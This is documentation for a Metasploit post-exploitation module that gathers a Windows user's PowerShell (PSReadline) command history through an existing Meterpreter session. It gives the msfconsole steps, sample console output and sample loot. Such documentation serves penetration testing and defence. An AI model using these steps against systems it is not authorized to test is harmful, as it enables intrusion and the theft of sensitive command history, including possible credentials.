## Vulnerable Application

  This post-exploitation module will extract PowerShell history.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/psreadline_history`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see the extracted PowerShell history in the loot files

## Options

  - **SESSION** - The session to run the module on.

## Scenarios

  **Using the module with a version earlier than PowerShell 5.0**

  In this scenario the module won't be able to work, as in earlier versions of PowerShell, the history of the commands in the current session is not being saved after it is closed.

  **Using the module with PowerShell 5.0+**

  In this scenario the module will try to extract the history file and save it in a loot file.

  ```
  msf exploit(handler) > use post/windows/gather/psreadline_history 
  msf post(psreadline_history) > set SESSION 1
  SESSION => 1
  msf post(psreadline_history) > run

  [*] Writing history to loot...
  [*] PSReadline history file of user IEUser saved to /home/user/.msf4/loot/20181223050921_default_10.0.2.15_ps.history_688257.txt
  [*] Post module execution completed
  ```

  The extracted history data would look like this:

  ```
  cd
  cls
  1+5
  Get-Help -Name Get-*
  Set-ExecutionPolicy Unrestricted
  Get-Service | Export-CSV c:\service.csv
  ```
